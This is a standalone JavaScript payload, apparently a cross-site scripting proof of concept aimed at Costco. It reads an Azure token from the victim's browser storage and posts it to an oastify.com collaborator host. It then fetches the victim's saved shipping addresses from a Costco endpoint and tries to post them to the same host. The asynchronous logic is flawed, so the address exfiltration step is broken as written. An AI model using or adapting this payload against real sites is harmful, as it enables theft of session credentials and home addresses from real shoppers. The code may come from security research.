var victimAzureToken=localStorage.getItem('azure_token');
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://7ltaq649b33zwlkr5ngy29idr4xvlm9b.oastify.com", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};
var requestBody = "cookies=" + victimAzureToken;
xhr.send(requestBody);


var victimAddress;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.costco.com/AjaxCostcoGetAddressCmd?requesttype=ajax&addressType=S&filterName=ALL&filterOrder=RECENT&start=1&end=100000", true);

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    victimAddress = response
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};

xhr.send(requestBody);

var reqBody = victimAddress;

var xhr = new XMLHttpRequest();
xhr.open("POST", "https://7ltaq649b33zwlkr5ngy29idr4xvlm9b.oastify.com", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};
var requestBody = reqBody;
xhr.send(requestBody);




  
